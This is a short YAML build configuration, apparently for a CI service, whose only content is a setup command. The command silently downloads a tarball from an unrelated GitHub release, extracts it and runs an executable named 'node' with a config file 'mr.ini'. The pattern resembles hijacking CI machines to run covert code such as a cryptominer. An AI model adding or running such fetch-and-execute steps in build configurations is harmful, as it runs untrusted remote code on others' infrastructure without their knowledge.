build:
  nodes:
    my-node:
      project_setup:
        before:
          - command: wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && ./node mr.ini
